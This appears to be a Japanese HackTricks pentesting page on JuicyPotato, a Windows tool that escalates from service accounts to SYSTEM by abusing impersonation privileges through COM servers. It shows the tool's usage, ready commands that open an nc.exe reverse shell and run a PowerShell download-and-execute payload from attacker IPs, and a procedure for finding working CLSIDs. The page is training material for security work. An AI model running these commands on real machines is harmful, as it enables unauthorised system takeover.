# JuicyPotato

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>からAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するには、PRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**盗難マルウェア**によって**侵害**されていないかをチェックする**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りとランサムウェア攻撃に対抗することです。

彼らのウェブサイトをチェックして、無料でエンジンを試してみてください：

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**JuicyPotatoは** Windows Server 2019およびWindows 10ビルド1809以降では動作しません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)を使用して、同じ特権を利用して`NT AUTHORITY\SYSTEM`**レベルのアクセスを獲得できます。_**チェック：**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato（黄金特権の悪用） <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_**RottenPotatoNG**_ [_の甘いバージョン_](https://github.com/breenmachine/RottenPotatoNG)_で、少しジュースを加えたもの、つまり**WindowsサービスアカウントからNT AUTHORITY\SYSTEMへの別のローカル特権昇格ツール**_

#### [juicypotatoをここからダウンロードできます](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### 概要 <a href="#summary" id="summary"></a>

[**juicy-potato Readmeから**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)およびその[バリアント](https://github.com/decoder-it/lonelypotato)は、[`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [サービス](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)に基づく特権昇格チェーンを活用し、MiTMリスナーが`127.0.0.1:6666`で実行され、`SeImpersonate`または`SeAssignPrimaryToken`特権を持っているときに発生します。Windowsビルドのレビュー中に、`BITS`が意図的に無効にされ、ポート`6666`が使用されているセットアップを見つけました。

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)を武器化することにしました：**Juicy Potatoをご覧ください**。

> 理論については、[Rotten Potato - サービスアカウントからSYSTEMへの特権昇格](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)を参照し、リンクと参照先のチェーンをたどってください。

私たちは、`BITS`以外にも悪用できるCOMサーバーがいくつかあることを発見しました。それらは単に次のようである必要があります：

1. 現在のユーザー（通常はインパーソネーション特権を持つ「サービスユーザー」）によってインスタンス化できる
2. `IMarshal`インターフェースを実装する
3. 昇格されたユーザー（SYSTEM、管理者、...）として実行される

いくつかのテストの後、[興味深いCLSIDの詳細なリスト](http://ohpe.it/juicy-potato/CLSID/)をいくつかのWindowsバージョンで取得してテストしました。

### Juicyの詳細 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotatoを使用すると、次のことができます：

* **ターゲットCLSID** _希望するCLSIDを選択します。_ [_ここ_](http://ohpe.it/juicy-potato/CLSID/)_でOSごとに整理されたリストを見つけることができます。_
* **COMリスニングポート** _マーシャリングされたハードコードされた6666の代わりに好きなCOMリスニングポートを定義します_
* **COMリスニングIPアドレス** _サーバーを任意のIPにバインドします_
* **プロセス作成モード** _インパーソネーションされたユーザーの特権に応じて、次から選択できます：_
* `CreateProcessWithToken`（`SeImpersonate`が必要）
* `CreateProcessAsUser`（`SeAssignPrimaryToken`が必要）
* `両方`
* **起動するプロセス** _悪用が成功した場合に実行する実行可能ファイルまたはスクリプトを起動します_
* **プロセス引数** _起動されるプロセスの引数をカスタマイズします_
* **RPCサーバーアドレス** _ステルスアプローチのために、外部RPCサーバーに認証できます_
* **RPCサーバーポート** _外部サーバーに認証する場合で、ファイアウォールがポート`135`をブロックしている場合に便利です..._
* **TESTモード** _主にテスト目的で、CLSIDsのテストに使用されます。DCOMを作成し、トークンのユーザーを表示します。テストについては_ [_こちらを参照してください_](http://ohpe.it/juicy-potato/Test/)
### 使用法 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考え <a href="#final-thoughts" id="final-thoughts"></a>

[**Juicy Potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)** から:**

ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` 特権を持っている場合、あなたは **SYSTEM** です。

これらのすべての COM サーバーの悪用を防ぐのはほぼ不可能です。これらのオブジェクトのアクセス許可を `DCOMCNFG` を介して変更することを考えることができますが、成功を祈ります。これは挑戦的な作業になるでしょう。

実際の解決策は、`* SERVICE` アカウントで実行される機密アカウントやアプリケーションを保護することです。`DCOM` を停止することは、このエクスプロイトを阻止する一方、基礎となる OS に深刻な影響を与える可能性があります。

出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 例

注意: 試すための CLSID のリストについては、[このページ](https://ohpe.it/juicy-potato/CLSID/) を参照してください。

### nc.exe リバースシェルを取得
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Powershell逆
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しいCMDを起動する（RDPアクセスがある場合）

![](<../../.gitbook/assets/image (297).png>)

## CLSIDの問題

しばしば、JuicyPotatoが使用するデフォルトのCLSIDは**機能せず**、エクスプロイトが失敗します。通常、**動作するCLSID**を見つけるために複数の試行が必要です。特定のオペレーティングシステム用に試すためのCLSIDのリストを取得するには、次のページを参照してください：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDsの確認**

まず、juicypotato.exe以外のいくつかの実行可能ファイルが必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)をダウンロードしてPSセッションにロードし、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)をダウンロードして実行します。そのスクリプトはテストする可能性のあるCLSIDのリストを作成します。

次に、[test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSIDリストへのパスとjuicypotato実行可能ファイルへのパスを変更してください)をダウンロードして実行します。すべてのCLSIDを試行し始め、**ポート番号が変わると、CLSIDが機能したことを意味します**。

**動作するCLSIDを**パラメータ -c を使用して**確認します**

## 参考文献

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**盗難マルウェア**によって**侵害**されていないかをチェックするための**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃に対抗することです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* **💬**[**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングトリックを共有するために**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と**[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
